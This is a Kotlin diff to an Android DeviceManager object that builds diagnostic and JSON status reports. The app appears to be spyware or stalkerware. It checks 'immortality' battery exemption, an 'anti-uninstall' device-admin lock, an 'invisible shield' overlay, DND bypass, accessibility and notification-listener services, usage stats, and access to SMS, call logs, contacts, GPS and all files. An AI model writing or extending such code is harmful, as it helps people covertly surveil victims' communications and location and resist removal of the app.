@@ -64,36 +64,32 @@ object DeviceManager {
         val sb = StringBuilder()
         sb.append("\n--- SYSTEM DIAGNOSTICS ---\n")
         
-        // 1. IMMORTALITY CHECKS
-        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-        val isIgnored = pm.isIgnoringBatteryOptimizations(ctx.packageName)
-        sb.append("BATTERY IMMUNITY: ").append(if(isIgnored) "[ACTIVE]" else "[VULNERABLE]").append("\n")
+        // 1. IMMORTALITY & BYPASS
+        sb.append("BATTERY IMMUNITY: ").append(if(PermissionManager.isIgnored(ctx)) "[ACTIVE]" else "[VULNERABLE]").append("\n")
+        sb.append("INVISIBLE SHIELD: ").append(if(PermissionManager.hasOverlayAccess(ctx)) "[ACTIVE]" else "[MISSING]").append("\n")
+        sb.append("DND BYPASS:       ").append(if(PermissionManager.hasDndAccess(ctx)) "[ACTIVE]" else "[LOCKED]").append("\n")
+        sb.append("ANTI-UNINSTALL:   ").append(if(PermissionManager.isAdmin(ctx)) "[ACTIVE]" else "[VULNERABLE]").append("\n")
         
-        val overlay = android.provider.Settings.canDrawOverlays(ctx)
-        sb.append("INVISIBLE SHIELD: ").append(if(overlay) "[ACTIVE]" else "[MISSING]").append("\n")
-        
-        // 2. SENSORS
-        val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
-        val accAlive = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
-            .any { it.resolveInfo.serviceInfo.packageName == ctx.packageName }
-        sb.append("ACCESSIBILITY:  ").append(if(accAlive) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
-        
-        val notifAlive = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
-        sb.append("NOTIF LISTENER:   ").append(if(notifAlive) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
-        
-        // 3. PERMISSIONS
-        val perms = mapOf(
+        // 2. CORE ENGINES
+        sb.append("ACCESSIBILITY:    ").append(if(PermissionManager.hasAccessibility(ctx)) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
+        sb.append("NOTIF LISTENER:   ").append(if(PermissionManager.hasNotificationListener(ctx)) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
+        sb.append("USAGE ANALYTICS:  ").append(if(PermissionManager.hasUsageStats(ctx)) "[ACTIVE]" else "[LOCKED]").append("\n")
+
+        // 3. RUNTIME MATRIX
+        val perms = mutableMapOf(
             "GPS" to android.Manifest.permission.ACCESS_FINE_LOCATION,
             "SMS" to android.Manifest.permission.READ_SMS,
             "CALL" to android.Manifest.permission.READ_CALL_LOG,
-            "FILE" to android.Manifest.permission.READ_EXTERNAL_STORAGE
+            "CONTACTS" to android.Manifest.permission.READ_CONTACTS
         )
+        if (android.os.Build.VERSION.SDK_INT >= 33) perms["NOTIF"] = android.Manifest.permission.POST_NOTIFICATIONS
+        
         sb.append("PERMISSIONS:      ")
         perms.forEach { (k, v) ->
             val granted = androidx.core.content.ContextCompat.checkSelfPermission(ctx, v) == PackageManager.PERMISSION_GRANTED
             sb.append("$k:").append(if(granted) "✓ " else "✗ ")
         }
-        sb.append("\n")
+        sb.append("\nFILES:            ").append(if(PermissionManager.hasAllFilesAccess(ctx)) "[UNRESTRICTED]" else "[LIMITED]").append("\n")
         
         // 4. STATS
         val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
@@ -173,18 +169,15 @@ object DeviceManager {
         json.put("permissions", perms)
 
         // 2. Service Status
-        val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
-        val accEnabled = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
-            .any { it.resolveInfo.serviceInfo.packageName == ctx.packageName }
-        json.put("accessibility_alive", accEnabled)
-        
-        val notifEnabled = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
-        json.put("notification_listener_alive", notifEnabled)
+        json.put("accessibility_alive", PermissionManager.hasAccessibility(ctx))
+        json.put("notification_listener_alive", PermissionManager.hasNotificationListener(ctx))
+        json.put("usage_stats_alive", PermissionManager.hasUsageStats(ctx))
 
-        // 3. Battery / Immortality Status
-        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-        val isIgnored = pm.isIgnoringBatteryOptimizations(ctx.packageName)
-        json.put("battery_optimization_ignored", isIgnored)
+        // 3. Immortality & Admin Status
+        json.put("battery_optimization_ignored", PermissionManager.isIgnored(ctx))
+        json.put("overlay_allowed", PermissionManager.hasOverlayAccess(ctx))
+        json.put("dnd_access_allowed", PermissionManager.hasDndAccess(ctx))
+        json.put("device_admin_active", PermissionManager.isAdmin(ctx))
         
         // 4. App Interaction
         val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
